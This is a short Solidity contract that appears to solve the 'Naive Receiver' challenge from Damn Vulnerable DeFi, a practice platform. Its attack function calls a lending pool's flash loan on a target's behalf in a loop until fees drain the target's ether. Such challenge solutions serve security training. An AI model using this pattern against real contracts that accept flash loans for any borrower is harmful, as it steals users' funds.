// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


/**
 * @title NaiveReceiverAttack
 * @notice Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @author Julius Raynaldi
 */
interface INaiveReceiverLenderPool{
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttack  {
    INaiveReceiverLenderPool public pool;
    address public target;
    constructor(address _target, address _pool) {
        pool = INaiveReceiverLenderPool(_pool);
        target = _target;
    }

    function attack() external {
        while (address(target).balance > 0) {
            pool.flashLoan(target, 1);
        }
    }
   
}
